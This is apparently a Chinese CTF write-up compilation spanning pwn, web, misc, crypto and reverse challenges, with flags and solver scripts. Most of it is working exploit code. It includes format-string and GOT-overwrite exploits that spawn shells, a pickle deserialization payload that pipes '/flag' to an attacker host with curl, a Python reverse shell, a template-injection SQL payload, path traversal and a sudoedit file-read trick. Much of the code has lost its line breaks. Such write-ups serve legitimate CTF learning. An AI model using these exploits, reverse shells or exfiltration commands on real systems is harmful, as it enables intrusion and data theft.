[['0', '1', '1', '1', '1', '1', '1', '1', '1', '1'], ['0', '0', '0', '1', '1', '1', '0', '0', '0', '0'], ['1', '1', '0', '0', '1', '1', '0', '1', '0', '1'], ['1', '1', '1', '0', '1', '1', '0', '1', '0', '1'], ['1', '0', '0', '0', '0', '0', '0', '1', '0', '1'], ['1', '0', '0', '1', '1', '1', '1', '1', '0', '1'], ['1', '1', '1', '0', '0', '0', '0', '0', '0', '1'], ['1', '0', '0', '0', '1', '1', '1', '1', '1', '1'], ['1', '0', '1', '0', '0', '0', '1', '0', '0', '0'], ['1', '0', '1', '1', '1', '0', '0', '0', '1', '0']]

3qzqns4hj6eeaxc!4a-%d735_@4l6gf1gd1v7hdm1+$-953}81a^21vbnm3!-#*f-e1d8_2ty9uipok-6r1802f7d19wez1c-f{0

flag{3eea35d-953744a-6d838d1e-f9802c-f7d10}

4

BWBA

import math
def ascii_to_str(l): return "".join(chr(i) for i in l)
def idct_ii(y): n = len(y) x = [0] * n for j in range(n): for k in range(n): if k == 0: x[j] += y[k] * math.sqrt(1/n) else: x[j] += y[k] * math.sqrt(2/n) * math.cos(math.pi * k * (j + 0.5) / n) return x
def decrypt(dct_list): ascii_list = idct_ii(dct_list) padded_s = ascii_to_str([int(round(x)) for x in ascii_list]) return padded_s.strip()

with open("enc", "r") as f: enc_data = list(map(float, f.read().split()))flag = decrypt(enc_data)print(flag)

flag{9ab488a7-5b11-1b15-04f2-c230704ecf72}

05

Pwn

1

p2038

from pwn import *p = remote('', )p.sendline(b'W'*0x440)p.interactive()

2

easy_LzhiFTP_CHELL

touch 存在越界 ，存放文件内容的堆地址正好再存放文件名的下方。

然后修改 index 0 改 free got 表 直接为 system 直接getshell

from pwn import *
s = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)ru = lambda delims, drop=True :io.recvuntil(delims, drop)itr = lambda :io.interactive()uu32 = lambda data :
u32(data.ljust(4,b'x00'))uu64 = lambda data :
u64(data.ljust(8,b'x00'))ls = lambda data :
log.success(data)
binary = './easy_LzhiFTP'libcelf = '/lib/x86_64-linux-gnu/libc.so.6'
elf = ELF(binary)libc = ELF(libcelf)context.arch = 'amd64'io = remote("",123)#io = process(binary)
system = 0bin_sh = 0poprdi = 0retn = 0libc_base=0
def cuos(func,addr): global system, bin_sh, poprdi, retn,libc_base libc_base = addr - libc.sym[func] log.success('libc_base : '+hex(libc_base)) system = libc_base + libc.sym['system'] bin_sh = libc_base + next(libc.search(b'/bin/shx00')) poprdi = libc_base + rop.find_gadget(['pop rdi','ret'])[0] retn = libc_base + rop.find_gadget(['ret'])[0]
def main(): ru('Username') sl('admin') ru('Password') s('rx00') ru('(yes/No)') s(f'No%{6+0x13}$pn') ru('No') elf_base = int(r(14),16) - 0x01C88 system = elf_base + elf.plt['system'] free = elf_base + elf.got['free'] ls(hex(elf_base)) for _ in range(0x10): ru('IMLZH1-FTP>') s(f'touch {_}.txtn') ru('write Context:') sl(f'/bin/sh;') ru('IMLZH1-FTP>') sl('del') ru(':') s('0') ru('IMLZH1-FTP>') sl(b'touch '+p64(free)) ru(':') sl('hack') gdb.attach(io) pause() ru('>') sl('edit') s('0') s(p64(system))

main()

3

babygame

void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){ int v3; // eax
 sub_400C00(a1, a2, a3); qword_602220 = (char *)mmap((void *)0x20000, 0x1000uLL, 7, 34, 0, 0LL);// 用来写shellcode if ( !qword_602220 ) exit(777); while ( 1 ) { while ( 1 ) { v3 = sub_400BA7(); if ( v3 != 2 ) break; shop(); // 通过玩猜md5游戏获取的分值，在这里消费 } if ( v3 == 3 ) exit(1); if ( v3 == 1 ) game(); // 就是猜MD5,实际是伪随机生成的字符串，每一次生成的值可以完全预测 }}

int sub_401104(){ int result; // eax
 puts("1. Purchase props "); puts("2. expansion backpack "); puts("3. Using props "); puts("4. View backpack "); printf("-------> [%d] <-------", qword_6020D0); puts(&byte_401991); printf(">> "); dword_602100 = 0; __isoc99_scanf("%d", &dword_602100); printf("%d", (unsigned int)dword_602100); result = dword_602100; if ( dword_602100 == 2 ) return sub_401396(); if ( dword_602100 > 2 ) { if ( dword_602100 == 3 ) { return sub_401072(); } else if ( dword_602100 == 4 ) { printf(qword_602220); // 存在格式化字符串漏洞 printf("Backpack size [%d]n", (unsigned int)nbytes); printf("Gold coin [%d]", qword_6020D0); return puts(&byte_401991); } } else if ( dword_602100 == 1 ) { return sub_40124D(); // 写入数据 } return result;}

qword_602220 = (char *)mmap((void *)0x20000, 0x1000uLL, 7, 34, 0, 0LL);// 用来写shellcode

from ctypes import *from pwn import *import hashlibimport time
s = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)ru = lambda delims, drop=True :io.recvuntil(delims, drop)itr = lambda :io.interactive()uu32 = lambda data :
u32(data.ljust(4,b'x00'))uu64 = lambda data :
u64(data.ljust(8,b'x00'))ls = lambda data :
log.success(data)
binary = './pwn'libc = ''target = ''#target = '39.106.131.193 30209'
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux','splitw','-h','-l','130']

if binary != '' : io = process(binary); elf = ELF(binary)if libc != '' : libc = ELF(libc); rop = ROP(libc)if ':' in target: tar = target.split(':');io = remote(tar[0],int(tar[1]))if ' ' in target: tar = target.split(' ');io = remote(tar[0],int(tar[1]))
system = 0bin_sh = 0poprdi = 0retn = 0libc_base=0
def cuos(func,addr): global system, bin_sh, poprdi, retn,libc_base libc_base = addr - libc.sym[func] log.success('libc_base : '+hex(libc_base)) system = libc_base + libc.sym['system'] bin_sh = libc_base + next(libc.search(b'/bin/shx00')) poprdi = libc_base + rop.find_gadget(['pop rdi','ret'])[0] retn = libc_base + rop.find_gadget(['ret'])[0]

clibc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
def md5_creck(): end = '' c = list('abcdefghijklmnopqrstuvwxyzA') for i in range(4): end += c[clibc.random() % 26] return end
def Start(): ru('>> ') sl('1') ru('level : ') sl('4')

def level_4(): ru('MD5(????) == ') #return r(32).decode('utf-8') ru('Give me : ') c = list('abcdefghijklmnopqrstuvwxyzA') end = '' for i in range(4): end += c[clibc.random() % 26] sl(end)

#def add_nbytes():
def EXP(Format): ru('>> ') sl('2') ru('>> ') sl('1') ru('Enter the letter you want to purchasen') sl(Format) ru('>> ') sl('2') ru('>> ') sl('4')

def solves(): Start() for i in range(70): clibc.srand(int(time.time())) x = r(len('MD5(????) == ')) if x == b'Wrong !!! Wro': Start() else: ru('Give me : ') c = list('abcdefghijklmnopqrstuvwxyzA') end = '' for i in range(4): end += c[clibc.random() % 26] sl(end) #else: # Start() #s = md5_creck() #print(hashlib.md5(s.encode()).hexdigest()) #sl(s)
 ru('Give me : ') sl('hack')

 ru('>> ') sl('2') ru('>> ') sl('2') ru('What size do you need : ') sl('500')
 # 17:
00b8│ 0x7ffea94b1338 —▸ 0x7ffea94b13a8 —▸ 0x7ffea94b3404 ◂— 'SHELL=/bin/bash' # 18:
00c0│ 0x7ffea94b1340 —▸ 0x7fa9a7f48190 ◂— 0x0 # 19:
00c8│ 0x7ffea94b1348 ◂— 0x0 # 1a:
00d0│ 0x7ffea94b1350 ◂— 0x0 # 1b:
00d8│ 0x7ffea94b1358 —▸ 0x400ac0 ◂— xor ebp, ebp # 1c:
00e0│ 0x7ffea94b1360 —▸ 0x7ffea94b1390 ◂— 0x1 # 1d:
00e8│ 0x7ffea94b1368 ◂— 0x0 # 1e:
00f0│ 0x7ffea94b1370 ◂— 0x0 # 1f:
00f8│ 0x7ffea94b1378 —▸ 0x400aea ◂— hlt # 20:
0100│ 0x7ffea94b1380 —▸ 0x7ffea94b1388 ◂— 0x1c # 21:
0108│ 0x7ffea94b1388 ◂— 0x1c # 22:
0110│ r13 0x7ffea94b1390 ◂— 0x1 # 23:
0118│ 0x7ffea94b1398 —▸ 0x7ffea94b33fe ◂— 0x4853006e77702f2e /* './pwn' */ # 24:
0120│ 0x7ffea94b13a0 ◂— 0x0 # 25:
0128│ 0x7ffea94b13a8 —▸ 0x7ffea94b3404 ◂— 'SHELL=/bin/bash'
 ##gdb.attach(io) pay = f'%{0x20+6}$p' Format = pay EXP(Format) ru('4') #print() stack1 = int(r(14),16) - 48 ls(hex(stack1))
 s1 = stack1 & 0xffff pay = f'%{s1}c%{0x17+6}$hnx00' Format = pay EXP(Format)
 # 17:
00b8│ 0x7ffd7b077e78 —▸ 0x7ffd7b077ee8 —▸ 0x7ffd7b077e98 —▸ 0x400ac0 ◂— xor ebp, ebp # 18:
00c0│ 0x7ffd7b077e80 —▸ 0x7f91fcc6b190 ◂— 0x0 # 19:
00c8│ 0x7ffd7b077e88 ◂— 0x0 # 1a:
00d0│ 0x7ffd7b077e90 ◂— 0x0 # 1b:
00d8│ 0x7ffd7b077e98 —▸ 0x400ac0 ◂— xor ebp, ebp # 1c:
00e0│ 0x7ffd7b077ea0 —▸ 0x7ffd7b077ed0 ◂— 0x1 # 1d:
00e8│ 0x7ffd7b077ea8 ◂— 0x0 # 1e:
00f0│ 0x7ffd7b077eb0 ◂— 0x0 # 1f:
00f8│ 0x7ffd7b077eb8 —▸ 0x400aea ◂— hlt # 20:
0100│ 0x7ffd7b077ec0 —▸ 0x7ffd7b077ec8 ◂— 0x1c # 21:
0108│ 0x7ffd7b077ec8 ◂— 0x1c # 22:
0110│ r13 0x7ffd7b077ed0 ◂— 0x1 # 23:
0118│ 0x7ffd7b077ed8 —▸ 0x7ffd7b0783fe ◂— 0x4853006e77702f2e /* './pwn' */ # 24:
0120│ 0x7ffd7b077ee0 ◂— 0x0 # 25:
0128│ 0x7ffd7b077ee8 —▸ 0x7ffd7b077e98 —▸ 0x400ac0 ◂— xor ebp, ebp

 printf_got = elf.got['exit']
 s1 = printf_got & 0xffff pay = f'%{s1}c%{0x25+6}$hnx00' Format = pay EXP(Format)

 s1 = (stack1 +2 )& 0xffff pay = f'%{s1}c%{0x17+6}$hnx00' Format = pay EXP(Format)

 s1 = (printf_got >> 0x10) & 0xffff pay = f'%{s1}c%{0x25+6}$hnx00' Format = pay EXP(Format)

 #gdb.attach(io,'b *0x04017D6') # 29:
0148│ 0x7fffa642c2a8 —▸ 0x7fffa642c258 —▸ 0x400ac0 ◂— xor ebp, ebp
 #pay = f'%{0x20010-2}c%{0x1b+6}$ln' + 'Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t' pay = f'%{0x20010}c%{0x1b+6}$ln' #pay = f'%{0x1b+6}$s' print(len(pay)) Format = pay EXP(Format)
 #s1 = printf_got & 0xffff #pay = f'%{s1}c%{0x25+6}$hnx00' #Format = pay #EXP(Format)

 s1 = (stack1+8)& 0xffff pay = f'%{s1}c%{0x17+6}$hnx00' Format = pay EXP(Format)

 ls(hex(stack1))

 # 1b:
00d8│ 0x7fffae2ad678 —▸ 0x602038 (exit@got.plt) —▸ 0x20010 ◂— 0 # 1c:
00e0│ 0x7fffae2ad680 —▸ 0x7fffae2ad6b0 —▸ 0x20010 ◂— 0 # 1d:
00e8│ 0x7fffae2ad688 ◂— 0x0 # 1e:
00f0│ 0x7fffae2ad690 ◂— 0x0 # 1f:
00f8│ 0x7fffae2ad698 —▸ 0x400aea ◂— hlt # 20:
0100│ 0x7fffae2ad6a0 —▸ 0x7fffae2ad6a8 ◂— 0x1c # 21:
0108│ 0x7fffae2ad6a8 ◂— 0x1c # 22:
0110│ r13 0x7fffae2ad6b0 —▸ 0x20010 ◂— 0 # 23:
0118│ 0x7fffae2ad6b8 —▸ 0x7fffae2af3fe ◂— 0x4853006e77702f2e /* './pwn' */ # 24:
0120│ 0x7fffae2ad6c0 ◂— 0x0 # 25:
0128│ 0x7fffae2ad6c8 —▸ 0x7fffae2ad680 —▸ 0x7fffae2ad6b0 —▸ 0x20010 ◂
 payload = """ xor eax,eax xor edi,edi mov esi,0x20000 syscall nop """ x = asm(payload) print(len(x)) print(disasm(x)) for i in range(0,len(x),2):
 s2 = 0x20010 + i pay = f'%{s2}c%{0x1c+6}$ln' EXP(pay)
 s1 = x[i:i+2] s1 = u16(s1.ljust(2,b"x00")) pay = f'%{s1}c%{0x22+6}$ln' print(len(pay)) Format = pay EXP(Format) #gdb.attach(io,'b *0x00401204')
 ru('>> ') #gdb.attach(io,'b *0x04017D6') sl('3') #io.interactive() payload = b'x90'*0x20 + asm(shellcraft.sh()) sl(payload)

if 'io' in dir(): solves() io.interactive()

4

sigin_shellcode

一个 Mips 程序，ubuntu 跑不起来,需要搭建一个qemu 环境

参考环境搭建异构框架之mips框架的pwn学习笔记 | CN-SEC 中文网

环境配置

pwntools + pwndbg 调试

开俩终端

1.第一个终端来启动程序，他会等待端口被连接后才正式执行

python exp.py

一定要像下面一样启动程序

io = process(["qemu-mipsel","-g","1234", "-L",".","pwn"])

2.第二个用于调试，来连接上面的那个

gdb-multiarch ./pwntarget remote 127.0.0.1:
1234

apt install binutils-mipsisa32r6-linux-gnu-dbgapt install gdbserver-mips32

然后就可以调试了

int get_coin(){ int v0; // $v0 unsigned __int8 *bufpos; // $v0 char v2; // $v0 int i; // [sp+18h] [+18h] FILE *__S; // [sp+1Ch] [+1Ch] char ch; // [sp+20h] [+20h] char coin2[5]; // [sp+24h] [+24h] BYREF
 srand(0x1BF52u); // 每一次都播同一个种子 coin = rand() % 114514 % (Floor_num + 1); // read()每次都是一个固定值 // 我们需要去猜这个 coin， puts("There are some coins.nHow much do you want?"); i = 0; while ( 1 ) { __S = (FILE *)_stdin; if ( *(_DWORD *)(_stdin + 36) ) { if ( __S->__bufpos >= __S->__bufgetc_u ) { v2 = _fgetc_unlocked(__S); } .....

battle

void battle(){ unsigned int v0; // $v0 int i; // [sp+18h] [+18h] int coin; // [sp+1Ch] [+1Ch] int result; // [sp+20h] [+20h] void (*func_ptr)(...); // [sp+24h] [+24h] char buf[80]; // [sp+28h] [+28h] BYREF
 puts("[-]The boss's DEF is 2751n[-]The boss's ATK is 9999"); printf("[-]Your DEF is 0n[-]Your ATK is %dn", attack); puts("[-]Now toss a coin to decide who attack first"); v0 = time(0); srand(v0); coin = rand() % 2; printf("[*]The COIN is %dn", coin); if ( coin == 1 ) { puts("[+]Boss get the first attack!"); puts("[+]0 - 9999 = -9999"); puts("You Died!!"); exit(0); // 运气好就不会退出 } if ( coin ) { printf("Woring!"); exit(0); // 运气好就不会退出 } puts("[+]You get the first attack!"); puts("[+]Attacking..."); result = attack - 2751; if ( attack - 2751 < 0 ) { printf("Your ATK is %dn", attack); exit(0); } puts("You beat the boss!!"); puts("Now open the box which the Princess in."); puts("I have already give you a useful_tools."); puts("Shellcode > "); memset(buf, 0, sizeof(buf)); read(0, buf, 0x10u); // 实际只能写8个字节，这里等会主要用来控制 A1 A2 寄存器 func_ptr = (void (*)(...))buf; for ( i = 0; i < strlen(buf); ++i ) { if ( !check(buf[i]) ) // 检测输入的是不是可见字符，可以x00绕过 { puts("[*]BOX: Forbidden!"); exit(0); } } useful_tools(); func_ptr();}

from pwn import *from ctypes import *
context(arch='mips',endian='little',log_level='debug')
#io = process(["qemu-mipsel","-L","./","./pwn"])io = process(["qemu-mipsel","-g","1234", "-L",".","pwn"])#io = remote('39.106.48.123', 44194)
c = [0] * 101
Floor_num = 0
for i in range(1,100): io.recvuntil('Go> n') io.sendline('1') io.recvuntil('How much do you want?n') p = 0x7c6ed291 % 114514 % i c[i] = p io.sendline(str(p)) if i == 99: io.recvuntil('Go> n') io.sendline('3') io.recvuntil('> ') io.sendline('3')
print(c)io.recvuntil('Go> n')io.sendline('3')io.recvuntil('> ')io.sendline('2')
io.recvuntil('Go> n')io.sendline('1')io.recvuntil('How much do you want?n')io.sendline('0')
io.recvuntil('Shellcode > n')s = 'x25x00x00x10'
s = asm('''li $a1,0li $a2,0''')print(s)
io.sendline(s)
io.interactive()

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
import numpy, base64
from flask import Flask, Response, requestapp = Flask(__name__)
@app.route('/', methods=['GET', 'POST'])def index(): return '小p想要找一个女朋友，你能帮他找找看么？'

@app.route('/girlfriends', methods=['GET', 'POST'])def girlfriends(): if request.values.get('data'): data = request.values.get('data') numpydata = base64.b64decode(data) if b'R' in numpydata or b'bash' in numpydata or b'sh' in numpydata: return '不能走捷径啊' resp = numpy.loads(numpydata) return '可以的，要的就是一种感觉' return '有进步了,但是不多'

@app.route('/download', methods=['GET', 'POST'])def download(): with open('www.zip', 'rb') as (f): stream = f.read() response = Response(stream, content_type='application/octet-stream') response.headers['Content-disposition'] = 'attachment;filename=www.zip' return response

if __name__ == '__main__': app.run(host='0.0.0.0', port=80)
# okay decompiling .app.cpython-38.pyc
import numpy
import pickleimport base64import osopcode=b'''c__builtin__mapp0 0(S'curl xxx:
5555/`cat /flag`'tp10(cossystemg1tp20g0g2x81p30c__builtin__tuplep4(g3tx81.'''
code=base64.b64encode(opcode)print(code)
# pickle.loads(base64.b64decode(code))numpydata = base64.b64decode(code)if b'R' in numpydata or b'bash' in numpydata or b'sh' in numpydata: print('不能走捷径啊')else: resp = numpy.loads(numpydata) print("ok")
POST /girlfriends HTTP/1.1Host: eci-2ze5mdaorvazf0lpit4y.cloudeci1.ichunqiu.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/113.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0OUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Requested-With: XMLHttpRequestContent-Type: application/x-www-form-urlencodedContent-Length: 177
data=Y19fYnVpbHRpbl9fCm1hcApwMAowKFMnY3VybCAxMjQuNzAuMjA2LjIzODo1NTU1L2BjYXQgL2ZsYWdgJwp0cDEKMChjb3MKc3lzdGVtCmcxCnRwMgowZzAKZzIKgXAzCjBjX19idWlsdGluX18KdHVwbGUKcDQKKGczCnSBLg==
Search=%3FSearch%3D%7B%7Bloop+sql%3D%27update+qc_user+set+Password%3Dmd5%281%29%27%7D%7DAhisec%7B%7B%2Floop%7D%7D/admin/templates/edit.html?Name=../../../../../flag
#（flag在work目录）当前目录GET /./flag HTTP/1.1Content-Length: 518
Host: 39.106.65.236:
29006User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/112.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Requested-With: XMLHttpRequest
https://blog.csdn.net/ziqibit/article/details/129461718cd /usr/localwget https://www.php.net/distributions/php-8.2.2.tar.gztar -zxvf php-8.2.2.tar.gz && cd php-8.2.2apt-get install build-essential autoconf automake libtool libsqlite3-dev pkg-config libjpeg-dev libpng-dev libxml2-dev libbz2-dev libcurl4-gnutls-dev libssl-dev libffi-dev libwebp-dev libonig-dev libzip-dev
./configure --prefix=/usr/local/php --sysconfdir=/etc/php --with-openssl --with-zlib --with-bz2 --with-curl --enable-bcmath --enable-gd --with-webp --with-jpeg --with-mhash --enable-mbstring --with-imap-ssl --with-mysqli --enable-exif --with-ffi --with-zip --enable-sockets --with-pcre-jit --enable-fpm --with-pdo-mysql --enable-pcntl
./configure --prefix=/usr/local/php #安装地址--sysconfdir=/etc/php #设置文件地址--with-openssl #启用ssl--with-zlib --with-bz2 --with-curl #启用curl--enable-bcmath --enable-gd --with-webp --with-jpeg --with-mhash --enable-mbstring --with-imap-ssl --with-mysqli --enable-exif --with-ffi --with-zip --enable-sockets --with-pcre-jit --enable-fpm --with-pdo-mysql #支持mysql--with-pdo-pgsql #支持pgsql--enable-pcntl
make && make install
import base64import requests

data = open('flag.zip','rb').read()print(data)base_Data = base64.b64encode(data)print(base_Data.decode())pars = {"data":
base_Data.decode()}url = requests.post("http://eci-2zeaqi1urh7o8mgpdl6q.cloudeci1.ichunqiu.com/?action=1365",data=pars)
import socketimport pickleimport osimport array
class Person(): def __reduce__(self): command=r"cat /flag>/tmp/pwned" return (os.system,(command,))
p=Person()opcode=pickle.dumps(p)print(opcode)f = open("exp.data","wb")f.write(opcode)f.close()
# 定义抽象命名空间套接字路径 没ss
# socket_path = " "+os.popen("ss -lx | grep '@'|awk '{print $5}'").read().replace("@","").strip()socket_path = " listener-51-0"print(socket_path)def sendfds(sock, fds): '''Send an array of fds over an AF_UNIX socket.'''
# 创建套接字sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
# 连接到服务器sock.connect(socket_path)
# 准备发送的数据data = opcode
def send_fds(sock, msg, fds): return sock.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, array.array("i", fds))])
file = open("exp.data",'rb')fd = file.fileno()parent_r, child_w = os.pipe()fds = [fd,child_w,fd,fd]msg = bytes([len(fds) % 256])send_fds(sock,msg,fds)
# 关闭套接字sock.close()file.close()
没有vim vi，就用原生编辑器nanoEDITOR='nano -- /flag' sudoedit /etc/GAMELAB
https://mp.weixin.qq.com/s/a0kh4dDBIiq8lqi8kBswVw
import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('xx',8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);
tar -czvf file.tar.gz evalp/
https://cybercompaacc.com/challenges/cryptography/crypto-tools/
flag{2c8ba897-0205-9bff-123d-281d12a24c38}
tcp.port == 20 &&tcp.dstport==80
bitlocker:
120483-350966-299189-055297-225478-133463-431684-359403
flag{f97d5b05-d312-46ac-919c-a140d7054ac5}
base58_chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'base58_vals = {c: v for v, c in enumerate(base58_chars)}
def decode_base58(enc): num = 0 for c in enc: num *= 58 num += base58_vals[c] return num.to_bytes((num.bit_length() + 7) // 8, 'big')
for i in range(14268): with open(f"./tmp_dc7fe258d0d39f50f605eb64cc8189eb-1/{i}.txt", "r") as f: data = f.read().splitlines() dec = decode_base58(data[0]) print(dec) with open('flag.txt',"a") as f: f.write(dec.decode())
import base64with open('flag.txt', 'r') as f: data = f.read()def decode(data): try: dec = base64.b64decode(data) print(f'解密后:{dec}') decode(dec) 
except Exception: passdecode(data)
b'flag{640ce012-3d3a-446d-9d0e-5d2fe840063b}'
from Crypto.Util.number import *import gmpy2n = 14381700422128582509148801752355744589949207890477326887251636389639477554903212313766087310581920423926674144511237847467160303159477932732842314969782540035709454603184976310835433114879043016737665256729350745769071186849072915716081380191025215059636548339167264601163525017898164466972776553148697204889820118261937316228241099344357088387154112255824092894798716597134811437852876763391697588672779069166285303075312833415574850549277205130215394422655325352478386576833373623679069271857652029364332047485797407322257853316210866532938722911480593571175419708834718860211036796987231227104370259051299799633809enc1 = 7213976567554002619445032200800186986758840297933991288547009708561953107405266725278346810536664670987171549114913443730366439254199110599202411546254632702440251000149674899033994570393935743323319736976929843596350656674709510612789987746895513057821629144725499933366382123251520676386059405796801097683107223771674383940907066300331503757142088898427893069444164604408189686282018392714450005250018004986102062209998463347007934222341910941474212611569508001910685822097788669516018081617394144015000387497289693096617795809933540456797387940627782045397249431573540932386564021712811633992948508497879189416719996092292320828635490820907122756459412206735413770335545012892724496210585503157766011075566023635046144730429791359690237088629187946232458937292767085665897489251315749496284368726255508362410603108788759785472319449267909859926786774679533591222665476101832482161295321411313525830843915966136814748249906589458905410141906965538387896747375546846618213595165688661941876715858338407833641907024891922856719044736945863722003318526031957256722493189062624177017279248142024760515092698242159769372410662895078523142768353100643884341413944795392762315999109544070401451087596138520908569234305384182336436670714204963907240715652950621301644972412252424876159530992enc2 = 15954854445966181136742750543358176358186230663706091821454832527034640100670779737656720251005109942306013877086451482243141488450122353285697850016200364912263403464109626937525725210545566742746628476797261121321515812788726862118315480354196115424526212965145342675007815411995594752584377871686965531829990461770047418586001518916553661158567047779694730702789677326905844275827365395845945286695577426050334364557405151339008293258932006267159313380746863008928500607405457044370494583863960981060999695448408234857505591647503423149271589648863473472196402149897680041851877198062464480400493467334040101779732999029043327947071232256187123316057998759518569161852646625701393295408789279678540894319137126821001853808931387200759810381958895695749251834840804088478214013923869059004663359509316215974475427057000629842098545503905230785431115754636129549758888267877395566717448365986552725726428222769339088308242580851434964429627168365161743834285778996916154182286570122208454025753108647581888781783757375011437394936853319184725324597963035778640646869326035848170752766298225095197226934969602554875402243303906613183431896300664684256018886119255870435413622515792072064528098344111446380223430819596310173312668368618931885819458529703118195242890075359424013033800260927722161030183373647798407301688760998313223874318513944409702828538509864933624724225689414495687466779277994989628367119101
def solve_pell(N, numTry = 100): cf = continued_fraction(sqrt(N)) for i in range(numTry): denom = cf.denominator(i) numer = cf.numerator(i) if numer^2 - N * denom^2 == 1: return numer, denom return None, None
x, y = solve_pell(N=1117)x1, y1 = x, yD = 1117flag1 = (enc1 - 1) // n^2 * gmpy2.invert(233, n) % nflag2 = (enc2%n^2 - 1) // n * gmpy2.invert(y1, n) % nflag = long_to_bytes(flag1)+long_to_bytes(flag2)print(flag) #3b'flag{11e89e28-4e27-47f0-a7c7-8e66c18881be}'
from Crypto.Util.number import *from Crypto.Util.Padding import pad
from random import randintfrom Crypto.Util.strxor import strxorfrom Crypto.Cipher import AES
from hashlib import sha256
from hashlib import md5
w, a, b, x = (31889563, 31153, 28517, 763220531)A, B, P = (1064988096, 802063264240, 12565302212045582769124388577074506881895777499095598016237085270545754804754108580101112266821575105979557524040668050927829331647411956215940656838233527)G = (359297413048687497387015267480858122712978942384458634636826020013871463646849523577260820163767471924019580831592309960165276513810592046624940283279131, 9290586933629395882565073588501573863992359052743649536992808088692463307334265060644810911389976524008568647496608901222631270760608733724291675910247770)M1 = (10930305358553250299911486296334290816447877698513318419802777123689138630792465404548228252534960885714060411282825155604339364568677765849414624286307139, 7974701243567912294657709972665114029771010872297725947444110914737157017082782484356147938296124777392629435915168481799494053881335678760116023075462921)M2 = (497353451039150377961380023736260648366248764299414896780530627602565037872686230259859191906258041016214805015473019277626331812412272940029276101709693, 8439756863534455395772111050047162924667310322829095861192323688205133726655589045018003963413676473738236408975953021037765999542116607686218566948766462)B_ = (5516900502352630982628557924432908395278078868116449817099410694627060720635892997830736032175084336697081211958825053352950153336574705799801251193930256, 10314456103976125214338213393161012551632498638755274752918126246399488480437083278584365543698685202192543021224052941574332651066234126608624976216302370)ct = b'x1axfbxa2xe1x86x04xfakx9axa3xd15xb8x16x1dxbcxa9Sxf5;xfaxf1x08dn~xd4x94xa4;^*xf6xd7xf10xa3xe1k`x1f-xefx80x16x80x80xe2'
E = EllipticCurve(GF(P), [A, B])G, M1, M2, B_ = [E(_) for _ in [G, M1, M2, B_]]z = M1-w*G-a*x*M1-b*x*Gk2 = sha256(str(z[0]).encode()).digest()[:6]k2 = bytes_to_long(k2)key = k2 * B_key = md5(str(int(key[0])).encode()).digest()cipher = AES.new(key, AES.MODE_ECB)m = cipher.decrypt(ct)print(m)
# flag{63259ab8-4916-4095-8888-d92c2b003e18}
int __cdecl main(int argc, const char **argv, const char **envp){ char *v3; // rbp int v4; // er14 unsigned int v5; // er12 __int64 i; // rbx char v7; // al int v8; // eax char *v9; // rax
 v3 = (char *)&matrix; v4 = 1; v5 = 0; puts("Welcome to Solver!"); do { for ( i = 0LL; i != 9; ++i ) { if ( !v3[i] ) { v7 = getchar(); if ( (unsigned __int8)(v7 - 49) > 8u ) v4 = 0; else v3[i] = v7 - 48; } v8 = v3[i]; v5 += v8; // v5 的值是 数独所有的数加起来的值 } v3 += 9; } while ( v3 != (char *)&matrix + 81 ); if ( v4 && (unsigned int)verify("Welcome to Solver!", argv) ) { puts("You Win!"); __snprintf_chk(buf, 32LL, 1LL, 32LL, "%d", v5); v9 = str2md5((__int64)buf, strlen(buf)); // md5加密 v5 __printf_chk(1LL, "flag is: flag{%s}nn", v9); exit(0); } puts("Again~"); return 0;}
